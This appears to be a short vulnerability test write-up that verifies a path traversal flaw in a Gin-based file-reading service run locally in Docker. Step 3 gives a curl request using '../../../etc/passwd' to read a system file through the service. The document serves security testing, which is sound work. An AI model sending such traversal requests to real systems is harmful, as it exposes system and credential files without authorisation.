Path Traversal Vulnerability Test
=================================

This document records the verification of a path traversal vulnerability in the file read service.

Environment
-----------
- Service: Gin-based file reader exposed on port 52865 (mapped to container 8080).
- Source code mounted from /mnt/c/Users/10278/AppData/Local/Temp/mock_project_2906112468.

Test Steps
----------

1.  Start the vulnerable service:

        docker compose up -d

2.  Wait for service to be ready (check http://localhost:52865/read?file=test ).

3.  Execute the path traversal attack:

        curl "http://localhost:52865/read?file=../../../etc/passwd"

4.  Observe the response. If the content of /etc/passwd is returned, the vulnerability is confirmed.

Cleanup
-------

    docker compose down -v
